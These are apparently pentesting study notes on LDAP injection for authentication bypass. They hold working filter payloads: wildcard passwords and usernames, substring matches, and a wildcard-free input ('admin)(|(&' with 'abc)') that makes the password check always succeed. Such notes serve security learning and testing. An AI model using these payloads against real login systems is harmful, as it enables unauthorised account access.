# LDAP - Authentication Bypass

# **Foundation**

- Since the authentication process needs to check the username and the password, an LDAP search filter like the following can be used
    
    ```bash
    (&(uid=admin)(userPassword=password123))
    ```
    
- Depending on the setup of the directory server, the actual search filter might query different attribute types
    - Username might be checked against the `cn` attribute type

# **Exploitation**

- Let us think of what we can inject into the search filter to bypass authentication
- Because an asterisk is treated as a wildcard character, we can inject it into the password field to match the value without specifying the actual password
- We can then specify an arbitrary valid username to bypass authentication for that user
    
    ```bash
    (&(uid=admin)(userPassword=*))
    ```
    
- If we do not know a valid username, we could inject a wildcard into the username field as well
    
    ```bash
    (&(uid=*)(userPassword=*))
    ```
    
    - Most likely we will be logged in as the first result
- We can also use substrings
    
    ```bash
    (&(uid=admin*)(userPassword=*))
    ```
    

### **Bypassing Authentication without Wildcards**

- Sometimes `*` is blocked by the application
- Alter the search filter so that the password check can fail and the search filter still returns a user
    - We can use `admin)(|(&`  and a password of `abc)`
    
    ```bash
    (&(uid=admin)(|(&)(userPassword=abc)))
    ```